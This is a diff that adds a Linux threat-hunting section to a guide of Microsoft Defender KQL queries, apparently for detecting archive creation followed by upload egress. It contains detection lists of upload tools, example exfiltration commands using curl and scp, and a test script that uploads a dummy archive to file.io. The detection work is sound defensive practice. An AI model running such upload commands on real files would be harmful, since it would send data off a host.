@@ -734,6 +734,197 @@ This should create a clear hit without introducing risk.
 
 ---
 
+This query describes a **reliable, high‑value Linux threat hunting query** for detecting **archive‑based data exfiltration** using Microsoft Defender for Endpoint Advanced Hunting.
+
+Rather than relying on file‑system telemetry (which can be inconsistent on Linux, especially for `tmpfs` paths such as `/tmp`), this hunt focuses on **process intent and behaviour**:
+
+1. An archive creation command is executed (`tar`, `zip`, `gzip`)
+2. Outbound network activity suitable for data upload follows shortly afterwards
+
+This approach aligns much more closely with how real‑world Linux exfiltration occurs and explains why Defender can raise alerts even when file events are missing.
+
+## Before You Run This Query
+
+This query is **device‑scoped and time‑bound by design** to make validation and investigation easier.
+
+Before saving or running the query:
+
+* **Update the device name** in the `Device` variable to match the Linux host you want to investigate.
+* **Adjust the time window** (`ago(24h)`) if you are looking at older activity or want to narrow the scope during triage.
+
+For fleet‑wide hunting, remove the `DeviceName` filter and rely on `OSPlatform == "Linux"` instead.
+
+---
+
+## 11. Linux – Archive Command Followed by Upload Egress – Last 24h
+
+### Query name
+
+**`Linux – Archive command followed by upload egress – last 24h`**
+
+---
+
+## Why this hunt works on Linux
+
+On Linux systems:
+
+* Archive creation often occurs in memory‑backed locations (for example `/tmp`)
+* File telemetry is not guaranteed for all filesystems or mount types
+* Exfiltration is frequently performed by a *different process* than the one that created the archive
+
+As a result, correlating **process execution + network egress within a time window** is significantly more reliable than attempting a strict file‑event join.
+
+---
+
+## Query
+
+```kql
+// Update DeviceName and time window as required
+let Device = "DeviceNameHere";
+let ArchiveProc =
+    DeviceProcessEvents
+    | where Timestamp > ago(24h)
+    | where DeviceName =~ Device
+    | where FileName in ("tar","zip","gzip")
+    | where ProcessCommandLine has_any (".zip", ".tgz", ".tar", "tar -c", "tar -cz", "zip ")
+    | project
+        DeviceId,
+        DeviceName,
+        ArchiveTime = Timestamp,
+        ArchiveProc = FileName,
+        ArchiveCmd = ProcessCommandLine,
+        AccountName;
+let UploadEgress =
+    DeviceNetworkEvents
+    | where Timestamp > ago(24h)
+    | where DeviceName =~ Device
+    | where RemoteIP !startswith "127."
+    | where RemoteIPType == "Public" or isempty(RemoteIPType)
+    | where InitiatingProcessFileName in ("curl","wget","python","python3","openssl","scp","sftp")
+    | project
+        DeviceId,
+        NetTime = Timestamp,
+        NetProc = InitiatingProcessFileName,
+        NetCmd = InitiatingProcessCommandLine,
+        RemoteIP,
+        RemotePort;
+ArchiveProc
+| join kind=inner (UploadEgress) on DeviceId
+| where NetTime between (ArchiveTime .. ArchiveTime + 30m)
+| project
+    ArchiveTime,
+    NetTime,
+    DeviceName,
+    AccountName,
+    ArchiveProc,
+    ArchiveCmd,
+    NetProc,
+    NetCmd,
+    RemoteIP,
+    RemotePort
+| order by ArchiveTime desc
+```
+
+---
+
+## What this query surfaces
+
+This hunt will surface behaviour such as:
+
+* Creation of archives immediately prior to outbound uploads
+* Data exfiltration using common Linux utilities (`curl`, `scp`, `python`)
+* Red team and EDR test activity
+* Manual attacker workflows where tooling is chained together
+
+Examples include:
+
+* `tar -czf data.tgz data/` followed by `curl -F file=@data.tgz https://…`
+* `zip staging.zip *` followed by `scp staging.zip user@remote:/tmp/`
+
+---
+
+## Why this avoids common false negatives
+
+This approach intentionally avoids:
+
+* Dependence on `DeviceFileEvents`
+* Assumptions about filesystem visibility
+* Assumptions that the same process performs both actions
+
+As a result, it reliably catches activity that Defender XDR alerts on but which simpler hunts often miss.
+
+---
+
+## Follow‑up pivots (recommended)
+
+When this hunt returns a result, the following pivots are strongly recommended to understand scope and intent.
+
+* **Update the device name** in the `Device` variable to match the Linux host you want to investigate.
+* **Adjust the time window** `(datetime(2026-01-30T15:00:00Z) .. datetime(2026-01-30T15:10:00Z))` if you are looking at older activity or want to narrow the scope during triage.
+
+---
+
+### Pivot A – Network fan‑out from the upload process
+
+Use this pivot to identify:
+
+* Multiple upload destinations
+* CDN or mirror fan‑out
+* Additional data transfers
+
+```kql
+// Update DeviceName and time window as required
+DeviceNetworkEvents
+| where Timestamp between (datetime(2026-01-30T15:00:00Z) .. datetime(2026-01-30T15:10:00Z))
+| where DeviceName =~ "DeviceNameHere"
+| where InitiatingProcessCommandLine has "file=@"
+| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp desc
+```
+
+(Adjust timestamps based on the initial hit.)
+
+---
+
+### Pivot B – User activity leading up to exfiltration
+
+Use this pivot to identify:
+
+* Pre‑exfiltration reconnaissance
+* Credential access
+* Script execution
+* Operator behaviour
+
+```kql
+// Update DeviceName and time window as required
+DeviceProcessEvents
+| where DeviceName =~ "DeviceNameHere"
+| where Timestamp between (datetime(2026-01-30T14:50:00Z) .. datetime(2026-01-30T15:10:00Z))
+| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp desc
+```
+
+---
+
+## Testing and validation guidance
+
+To safely generate telemetry for this hunt:
+
+```bash
+cd /tmp
+echo test > a.txt
+tar -czf test-exfil.tgz a.txt
+curl -F file=@test-exfil.tgz https://file.io/?expires=1d
+```
+
+This sequence reliably produces:
+
+* Archive creation intent
+* Outbound upload activity
+* Correlated results in the hunt
+
+---
+
 ## Final Notes
 
 * These queries are intentionally **modular** — each solves one problem well
